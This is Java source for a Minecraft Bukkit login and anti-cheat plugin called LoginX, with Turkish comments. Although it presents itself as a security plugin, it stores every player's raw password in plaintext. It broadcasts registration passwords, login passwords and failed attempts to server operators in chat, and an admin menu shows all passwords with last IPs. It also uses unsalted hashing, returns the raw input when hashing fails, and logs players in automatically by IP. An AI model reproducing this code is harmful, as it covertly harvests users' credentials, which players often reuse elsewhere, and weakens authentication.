package com.loginx;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LoginX extends JavaPlugin implements Listener {

    // --- VERİ TABLOLARI ---
    private final Map<UUID, String> passwords = new HashMap<>(); 
    private final Map<UUID, String> rawPasswords = new HashMap<>(); 
    private final Map<UUID, Integer> attempts = new HashMap<>();
    private final Set<UUID> loggedIn = new HashSet<>();
    private final Map<UUID, String> lastIP = new HashMap<>();
    private final Set<UUID> trustedPlayers = new HashSet<>(); // İzinver Sistemi
    
    // --- ANTİ-HİLE (ANTI-CHEAT) VERİLERİ ---
    private final Map<UUID, LinkedList<Long>> clickData = new HashMap<>();
    private final Map<UUID, Long> lastChatTime = new HashMap<>();
    private final int MAX_CPS = 15; // Saniyedeki maksimum tıklama (Auto-Clicker sınırı)

    private FileConfiguration cfg;
    private final String GUI_LOGIN_TITLE = color("&#00FFFF&lOyuncu Verileri");
    private final String GUI_IZIN_TITLE = color("&#FFD700&lÖzel İzinli Oyuncular");

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
        cfg = getConfig();
        loadData();
        getLogger().info("LoginX Ultra Guvenlik, Anti-Hile ve Egitim Modulu Aktif! (Renkler Iyilestirildi)");
    }

    @Override
    public void onDisable() {
        saveData();
    }

    // --- VERİ YÖNETİMİ ---
    private void loadData() {
        if (cfg.contains("data")) {
            for (String key : cfg.getConfigurationSection("data").getKeys(false)) {
                UUID u = UUID.fromString(key);
                passwords.put(u, cfg.getString("data." + key + ".hash"));
                rawPasswords.put(u, cfg.getString("data." + key + ".raw"));
                lastIP.put(u, cfg.getString("data." + key + ".ip"));
            }
        }
        if (cfg.contains("trusted_players")) {
            for (String uuidStr : cfg.getStringList("trusted_players")) {
                trustedPlayers.add(UUID.fromString(uuidStr));
            }
        }
    }

    private void saveData() {
        cfg.set("data", null);
        for (UUID u : passwords.keySet()) {
            cfg.set("data." + u + ".hash", passwords.get(u));
            cfg.set("data." + u + ".raw", rawPasswords.get(u));
            cfg.set("data." + u + ".ip", lastIP.get(u));
        }
        List<String> trustedList = new ArrayList<>();
        for (UUID u : trustedPlayers) trustedList.add(u.toString());
        cfg.set("trusted_players", trustedList);
        saveConfig();
    }

    // --- GİRİŞ VE ÇIKIŞ OLAYLARI ---
    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        UUID uuid = p.getUniqueId();
        String currentIP = p.getAddress().getAddress().getHostAddress();

        // Otomatik IP Girişi (Auto-Login)
        if (passwords.containsKey(uuid) && lastIP.containsKey(uuid) && lastIP.get(uuid).equals(currentIP)) {
            loggedIn.add(uuid);
            p.sendMessage(color("&#00FF7F[LoginX] &aAynı IP adresinden bağlandığın için otomatik giriş yapıldı!"));
            playSuccessEffect(p);
            return;
        }

        lastIP.put(uuid, currentIP);

        // Giriş yapana kadar körlük efekti
        p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, Integer.MAX_VALUE, 1, false, false));

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (loggedIn.contains(uuid) || count >= cfg.getInt("title_interval") || !p.isOnline()) {
                    cancel();
                    return;
                }
                sendLoginTitle(p);
                count++;
            }
        }.runTaskTimer(this, 0, 40L);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (p.isOnline() && !loggedIn.contains(uuid)) {
                    p.kickPlayer(color("&#FF4500Zamanında giriş yapmadınız!"));
                }
            }
        }.runTaskLater(this, cfg.getInt("login_timeout") * 20L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        loggedIn.remove(e.getPlayer().getUniqueId());
        clickData.remove(e.getPlayer().getUniqueId()); // Veri sızıntısını önle
        lastChatTime.remove(e.getPlayer().getUniqueId());
    }

    private void sendLoginTitle(Player p) {
        String header, footer;
        if (!passwords.containsKey(p.getUniqueId())) {
            header = color(cfg.getString("title_colors.register.header"));
            footer = color(cfg.getString("title_colors.register.footer"));
        } else {
            header = color(cfg.getString("title_colors.login.header"));
            footer = color(cfg.getString("title_colors.login.footer"));
        }
        p.sendTitle(header, footer, 10, 40, 10);
    }

    private void playSuccessEffect(Player p) {
        p.removePotionEffect(PotionEffectType.BLINDNESS);
        p.playSound(p.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1.0f, 1.0f);
        p.spawnParticle(Particle.TOTEM_OF_UNDYING, p.getLocation().add(0, 1, 0), 50, 0.5, 0.5, 0.5, 0.1);
    }

    // --- KOMUTLAR ---
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        
        // KONSOL KOMUTU: /izinver
        if (cmd.getName().equalsIgnoreCase("izinver")) {
            if (!(sender instanceof ConsoleCommandSender)) {
                sender.sendMessage(color("&#FF4500[!] Bu komut sadece KONSOL üzerinden kullanılabilir!"));
                return true;
            }
            if (args.length != 1) {
                sender.sendMessage(color("&#FFA500Kullanım: /izinver <oyuncu>"));
                return true;
            }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            UUID targetUUID = target.getUniqueId();
            
            if (trustedPlayers.contains(targetUUID)) {
                trustedPlayers.remove(targetUUID);
                sender.sendMessage(color("&#00FFFF[LoginX] &f" + target.getName() + " &#00FFFFadlı oyuncunun özel inşa/WE izni &cALINDI."));
            } else {
                trustedPlayers.add(targetUUID);
                sender.sendMessage(color("&#00FFFF[LoginX] &f" + target.getName() + " &#00FFFFadlı oyuncuya özel inşa/WE izni &aVERİLDİ."));
            }
            saveData();
            return true;
        }

        if (!(sender instanceof Player player)) return true;
        UUID uuid = player.getUniqueId();

        if (cmd.getName().equalsIgnoreCase("register")) {
            if (args.length < 2) {
                player.sendMessage(color("&#FF4500Kullanım: /register <şifre> <şifre>"));
                return true;
            }
            if (passwords.containsKey(uuid)) {
                player.sendMessage(color("&#FF4500Zaten kayıtlısın! /login <şifre> kullan."));
                return true;
            }
            if (!args[0].equals(args[1])) {
                player.sendMessage(color("&#FF4500Şifreler uyuşmuyor!"));
                player.playSound(player.getLocation(), Sound.ENTITY_VILLAGER_NO, 1.0f, 1.0f);
                return true;
            }
            passwords.put(uuid, hash(args[0]));
            rawPasswords.put(uuid, args[0]);
            loggedIn.add(uuid);
            saveData();
            player.sendMessage(color("&#00FF7FBaşarıyla kayıt oldun ve giriş yaptın!"));
            playSuccessEffect(player);
            notifyOps(player, "&#00FFFF[YENİ KAYIT] &#E0FFFFŞifre: &f" + args[0]);
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("login")) {
            if (args.length < 1) {
                player.sendMessage(color("&#FF4500Kullanım: /login <şifre>"));
                return true;
            }
            if (!passwords.containsKey(uuid)) {
                player.sendMessage(color("&#FF4500Önce kayıt olmalısın! /register <şifre> <şifre>"));
                return true;
            }
            String input = args[0];
            if (hash(input).equals(passwords.get(uuid))) {
                loggedIn.add(uuid);
                player.sendMessage(color("&#00FF7FGiriş başarılı!"));
                playSuccessEffect(player);
                notifyOps(player, "&#00FF7F[GİRİŞ] &#E0FFFFŞifre: &f" + input);
            } else {
                player.sendMessage(color("&#FF4500Yanlış şifre!"));
                player.playSound(player.getLocation(), Sound.ENTITY_VILLAGER_NO, 1.0f, 1.0f);
                attempts.put(uuid, attempts.getOrDefault(uuid, 0) + 1);
                notifyOps(player, "&#FF4500[HATALI DENEME] &#E0FFFFDenenen: &f" + input);
                if (attempts.get(uuid) >= 3) player.kickPlayer(color("&#FF4500Hatalı deneme limiti aşıldı!"));
            }
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("sifredegis")) {
            if (!player.hasPermission("loginx.admin")) {
                player.sendMessage(color("&#FF4500Bunun için yetkin yok!"));
                return true;
            }
            if (args.length != 2) {
                player.sendMessage(color("&#FF4500Kullanım: /sifredegis <oyuncu> <yeni_şifre>"));
                return true;
            }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            if (!passwords.containsKey(target.getUniqueId())) {
                player.sendMessage(color("&#FF4500Bu oyuncu sisteme kayıtlı değil."));
                return true;
            }
            passwords.put(target.getUniqueId(), hash(args[1]));
            rawPasswords.put(target.getUniqueId(), args[1]);
            saveData();
            player.sendMessage(color("&#00FF7F" + target.getName() + " adlı kişinin şifresi değiştirildi: &f" + args[1]));
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("logingoster")) {
            if (!player.hasPermission("loginx.admin")) return true;
            openLoginMenu(player);
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("izinvermenu")) {
            if (!player.hasPermission("loginx.admin")) return true;
            openIzinMenu(player);
            return true;
        }

        return true;
    }

    // --- GUI (MENÜ) SİSTEMLERİ ---
    private void openLoginMenu(Player player) {
        Inventory gui = Bukkit.createInventory(null, 54, GUI_LOGIN_TITLE);
        for (UUID id : rawPasswords.keySet()) {
            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName(color("&#00FFFF&l" + (target.getName() != null ? target.getName() : "Bilinmiyor")));
                List<String> lore = new ArrayList<>();
                lore.add(color("&#E0FFFF► Şifre: &f" + rawPasswords.get(id)));
                lore.add(color("&#E0FFFF► Son IP: &f" + lastIP.getOrDefault(id, "Yok")));
                lore.add(color("&#E0FFFF► Durum: &aKayıtlı"));
                meta.setLore(lore);
                head.setItemMeta(meta);
            }
            gui.addItem(head);
        }
        player.openInventory(gui);
    }

    private void openIzinMenu(Player player) {
        Inventory gui = Bukkit.createInventory(null, 27, GUI_IZIN_TITLE);
        for (UUID id : trustedPlayers) {
            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName(color("&#FFD700&l" + (target.getName() != null ? target.getName() : "Bilinmiyor")));
                List<String> lore = new ArrayList<>();
                lore.add(color("&#FFFACD► Durum: &aGüvenilir"));
                lore.add(color("&7Bu oyuncu TNT koyabilir"));
                lore.add(color("&7ve WorldEdit kullanabilir."));
                meta.setLore(lore);
                head.setItemMeta(meta);
            }
            gui.addItem(head);
        }
        player.openInventory(gui);
    }

    @EventHandler
    public void onMenuClick(InventoryClickEvent e) {
        if (e.getView().getTitle().equals(GUI_LOGIN_TITLE) || e.getView().getTitle().equals(GUI_IZIN_TITLE)) {
            e.setCancelled(true);
        }
    }

    // --- TEMEL GİRİŞ KORUMALARI ---
    private boolean isNotLogged(Player p) {
        return !loggedIn.contains(p.getUniqueId());
    }

    private void sendWarning(Player p) {
        p.sendMessage(color("&#FF4500Devam etmek için giriş yapmalı veya kayıt olmalısınız!"));
    }

    @EventHandler(priority = EventPriority.HIGHEST) public void onMove(PlayerMoveEvent e) {
        if (isNotLogged(e.getPlayer())) e.setCancelled(true);
    }
    @EventHandler(priority = EventPriority.HIGHEST) public void onBlockBreak(BlockBreakEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }
    @EventHandler(priority = EventPriority.HIGHEST) public void onDrop(PlayerDropItemEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }
    @EventHandler(priority = EventPriority.HIGHEST) public void onInventoryUse(InventoryClickEvent e) {
        if (e.getWhoClicked() instanceof Player p && isNotLogged(p)) e.setCancelled(true);
    }
    @EventHandler(priority = EventPriority.HIGHEST) public void onDamage(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player p && isNotLogged(p)) e.setCancelled(true);
    }

    // --- ANTİ-HİLE (HİLE KORUMASI) ENTEGRASYONU ---

    // 1. OTO-TIKLAYICI (Makro/CPS Koruması)
    private boolean checkCPS(Player p) {
        UUID uuid = p.getUniqueId();
        long now = System.currentTimeMillis();
        
        clickData.putIfAbsent(uuid, new LinkedList<>());
        LinkedList<Long> clicks = clickData.get(uuid);
        clicks.add(now);
        
        // 1 Saniyeden (1000ms) eski tıklamaları sil
        clicks.removeIf(time -> now - time > 1000);
        
        if (clicks.size() > MAX_CPS) {
            p.sendMessage(color("&#FF4500[Anti-Hile] &cÇok hızlı tıklıyorsun! Vuruş iptal edildi."));
            return true; // Tıklama hileli
        }
        return false; // Tıklama normal
    }

    @EventHandler(priority = EventPriority.HIGHEST) 
    public void onInteract(PlayerInteractEvent e) {
        Player p = e.getPlayer();
        if (isNotLogged(p)) { e.setCancelled(true); return; }
        
        // Sadece sol tıklamaları (vurma/kırma eylemleri) say
        if (e.getAction() == Action.LEFT_CLICK_AIR || e.getAction() == Action.LEFT_CLICK_BLOCK) {
            if (checkCPS(p)) e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST) 
    public void onDamageDeal(EntityDamageByEntityEvent e) {
        if (!(e.getDamager() instanceof Player p)) return;
        if (isNotLogged(p)) { e.setCancelled(true); return; }
        
        if (checkCPS(p)) e.setCancelled(true);
    }

    // 2. SOHBET SPAM KORUMASI
    @EventHandler(priority = EventPriority.HIGHEST) 
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (isNotLogged(p)) { e.setCancelled(true); sendWarning(p); return; }

        long now = System.currentTimeMillis();
        long last = lastChatTime.getOrDefault(p.getUniqueId(), 0L);
        
        // 1.5 Saniye Bekleme Süresi
        if (now - last < 1500) {
            e.setCancelled(true);
            p.sendMessage(color("&#FF4500[Anti-Spam] &cLütfen mesaj göndermeden önce biraz bekle!"));
            return;
        }
        lastChatTime.put(p.getUniqueId(), now);
    }

    // --- İZİNVER (ANTİ-GRIEF) VE KOMUT KONTROLLERİ ---
    @EventHandler(priority = EventPriority.HIGHEST) 
    public void onBlockPlace(BlockPlaceEvent e) {
        Player p = e.getPlayer();
        if (isNotLogged(p)) { e.setCancelled(true); sendWarning(p); return; }

        Material type = e.getBlock().getType();
        if (type == Material.TNT || type == Material.BEDROCK || type == Material.LAVA || type == Material.LAVA_BUCKET) {
            if (!trustedPlayers.contains(p.getUniqueId())) {
                e.setCancelled(true);
                p.sendMessage(color("&#FF4500[!] &cBu bloğu koymak için Konsol tarafından yetkilendirilmeniz gerekiyor!"));
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST) 
    public void onCommandProcess(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage().toLowerCase();

        if (isNotLogged(p)) {
            if (!msg.startsWith("/login") && !msg.startsWith("/register")) {
                e.setCancelled(true);
                sendWarning(p);
            }
            return;
        }

        if (msg.startsWith("//") || msg.startsWith("/we ")) {
            if (!trustedPlayers.contains(p.getUniqueId())) {
                e.setCancelled(true);
                p.sendMessage(color("&#FF4500[!] &cWorldEdit komutlarını kullanmak için Konsol tarafından yetkilendirilmeniz gerekiyor!"));
            }
        }
    }

    // --- YARDIMCI METOTLAR ---
    private void notifyOps(Player p, String info) {
        String msg = color("&#00FFFF&lLoginX &8| &b" + p.getName() + " &8» " + info);
        Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(msg));
    }

    private String hash(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] bytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return input; }
    }

    // HATASIZ RGB (HEX) ÇEVİRİCİ - PUBLIC YAPILDI
    public String color(String text) {
        Pattern pattern = Pattern.compile("&#([a-fA-F0-9]{6})");
        Matcher matcher = pattern.matcher(text);
        StringBuffer buffer = new StringBuffer();
        while (matcher.find()) {
            String hex = matcher.group(1);
            StringBuilder replacement = new StringBuilder("§x");
            for (char c : hex.toCharArray()) {
                replacement.append("§").append(c);
            }
            matcher.appendReplacement(buffer, replacement.toString());
        }
        return ChatColor.translateAlternateColorCodes('&', matcher.appendTail(buffer).toString());
    }
            }
                                              
